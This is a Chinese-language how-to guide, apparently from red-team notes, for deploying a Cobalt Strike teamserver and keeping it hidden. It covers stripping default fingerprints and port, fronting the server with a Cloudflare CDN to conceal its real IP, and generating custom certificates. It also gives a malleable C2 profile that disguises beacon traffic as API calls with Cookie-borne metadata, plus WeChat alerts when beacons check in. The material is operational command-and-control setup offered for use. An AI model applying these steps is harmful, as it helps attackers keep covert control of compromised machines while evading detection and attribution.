# 0x01 CS服务端启动
将CS4.5文件夹上传到VPS上，执行如下命令即可启动，需要注意，IP地址不能是0.0.0.0
```
./teamserver 192.168.0.125 password
```

# 0x02 CS服务端特征去除
### 01 修改teamserver默认端口
打开文件teamserver，将默认的50050端口改为其他端口
### 02 修改teamserver默认指纹信息
正常情况使用nmap扫描时可看到此特征，如下图  
![image](./pic/02.png)  
阅读代码可知，当没有证书的时候会创建带有cobalt strike信息的证书，有证书的话，则会使用证书中的信息，下面我们会创建自己的证书，就不需要修改teamserver中的cobalt strike信息

# 0x03 CS隐藏真实IP
思路：基于CDN隐藏真实IP
### 步骤1 注册一个域名
有的文章提到使用www.freenom.com平台进行注册，我这边测试从freenom注册免费域名挺费劲的，试了几次都没成功，建议从namesilo购买一个域名，选一个不那么大众化的，每年0.99$
### 步骤2 cdn平台配置dns解析
此处需要图文说明，参见文章[https://xz.aliyun.com/t/11099](https://xz.aliyun.com/t/11099)中的”CDN平台配置DNS解析”部分，地址：https://xz.aliyun.com/t/11099#toc-2
```
添加DNS记录时如下
Name：ybdt，IPv4 address：服务器 IP
```
### 步骤3 CDN平台创建证书
此处需要图文说明，参见文章[https://xz.aliyun.com/t/11099](https://xz.aliyun.com/t/11099)中的”CDN平台创建证书”部分，地址：https://xz.aliyun.com/t/11099#toc-3
```
要注意，创建时要保存证书和私钥，不然后面没法再看到私钥
```
### 步骤4 CDN平台禁用缓存
此处需要图文说明，参见文章[https://xz.aliyun.com/t/11099](https://xz.aliyun.com/t/11099)中的”CDN平台禁用缓存”部分，地址：https://xz.aliyun.com/t/11099#toc-4
### 步骤5 生成CS证书
进入vps中的cs文件夹中，创建两个文件：server.pem（文件中贴入上面的源证书）和server.key（文件中贴入上面的私钥），然后生成新的cobaltstrike证书，如果原先的cobaltstrike文件夹内有默认的.store证书，需要先删除掉默认的
```
openssl pkcs12 -export -in server.pem -inkey server.key -out cfcert.p12 -name cloudflare_cert -passout pass:123456

这里是利用pem和key文件创建新的cert证书，这里的pass密码需要修改，改为复杂的密码，不要使用123456
```
借助生成的cert证书，通过以下命令生成store证书
```
keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore cfcert.store -srckeystore cfcert.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias cloudflare_cert
```
### 步骤6 创建profile文件
```
set sleeptime "3000";

https-certificate {
    set keystore "cfcert.store";
    set password "123456";
}

http-stager {
    set uri_x86 "/api/1";
    set uri_x64 "/api/2";
    client {
        header "Host" "ybdt.test.com";}
    server {
        output{
            print;
        }
    }
}

http-get {
    set uri "/api/3";
    client {
        header "Host" "ybdt.test.com";
        metadata {
            base64;
            header "Cookie";
        }
    }
    server {
        output {
            print;
        }
    }
}

http-post {
    set uri "/api/4";
    client {
        header "Host" "ybdt.test.com";
        id {
            uri-append;
        }
        output {
            print;
        }
    }
    server {
        output {
            print;
        }
    }
}

```
### 步骤7 创建监听器
此处需要图文说明，参见文章[https://xz.aliyun.com/t/11099](https://xz.aliyun.com/t/11099)中的”启动teamserver”部分，地址：https://xz.aliyun.com/t/11099#toc-9
```
需要注意，CloudFlare CDN免费支持的端口如下
http:
80、8080、8880、2052、2082、2086、2095
https:
443、2053、2083、2087、2096、8443
```
### 步骤8 上线测试
上线后，我这边wireshark抓包，抓到的ip查询后发现是微软云（可能是cloudflare的节点在微软云上，或其他原因），如下图  
![image](./pic/01.png)
```
注意，vps的防火墙要打开，我就在这卡了一会
```

# 0x04 CS上线微信提醒
此处需要图文说明，参见文章[https://xz.aliyun.com/t/10698](https://xz.aliyun.com/t/10698)中的”微信单人提醒”部分，地址：https://xz.aliyun.com/t/11099#toc-9

不过有2处需要修改：  
01、vps会提示需要转发x11请求，解决办法：启动时需要加一个参数-Djava.awt.headless=true，修改后如下
```
java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Djava.awt.headless=true -classpath ./cobaltstrike.jar aggressor.headless.Start $*
```
02、注释掉一处安全提醒
```
This can be done by editing the accessibility.properties file for OpenJDK:
sudo vim /etc/java-8-openjdk/accessibility.properties
Comment out the following line:
assistive_technologies=org.GNOME.Accessibility.AtkWrapper
```

# 参考链接
```
https://xz.aliyun.com/t/11099
https://xz.aliyun.com/t/10698
https://github.com/microsoft/vscode-arduino/issues/644
```